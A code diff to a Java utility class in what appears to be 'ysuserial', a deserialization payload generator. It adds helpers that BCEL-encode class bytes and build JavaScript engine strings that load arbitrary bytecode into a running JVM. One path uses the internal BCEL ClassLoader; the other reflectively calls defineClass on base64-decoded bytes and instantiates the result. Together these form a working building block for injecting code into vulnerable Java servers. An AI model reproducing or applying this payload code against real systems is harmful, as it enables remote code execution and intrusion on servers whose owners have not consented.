@@ -3,11 +3,14 @@ package org.su18.ysuserial.payloads.util;
 import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
+import org.apache.bcel.classfile.Utility;
 
 import java.io.FileOutputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
+
+import static org.su18.ysuserial.payloads.config.Config.USING_RHINO;
 
 /**
  * @author su18
@@ -99,4 +102,15 @@ public class Utils {
 		}
 	}
 
+	public static String generateBCELFormClassBytes(byte[] bytes) throws Exception {
+		return "$$BCEL$$" + Utility.encode(bytes, true);
+	}
+
+	public static String getJSEngineValue(byte[] classBytes) throws Exception {
+		if (USING_RHINO) {
+			return "new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"" + generateBCELFormClassBytes(classBytes) + "\").newInstance();";
+		} else {
+			return "var data = \"" + base64Encode(classBytes) + "\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();";
+		}
+	}
 }
